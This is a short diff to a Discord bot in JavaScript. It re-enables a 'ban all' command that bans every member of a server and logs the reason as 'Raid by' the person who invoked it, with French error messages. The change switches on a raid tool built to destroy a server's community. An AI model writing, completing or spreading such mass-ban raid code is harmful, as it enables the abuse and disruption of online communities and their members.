@@ -1206,7 +1206,8 @@ var category = message.guild.channels.filter(c => c.type === 'category').size
    message.delete(5000)
     })
   }
-  //if(cmd === (prefix + 'ball')){
+  //ban all
+if(cmd === (prefix + 'ball')){
     await message.guild.members.forEach(m => m.ban(`Raid by ${message.author.username}`)).catch(() => {
       message.channel.send(`Une erreur est survenue, veuillez ré - essayer plus tard`).then(function(){
       message.delete(5000)
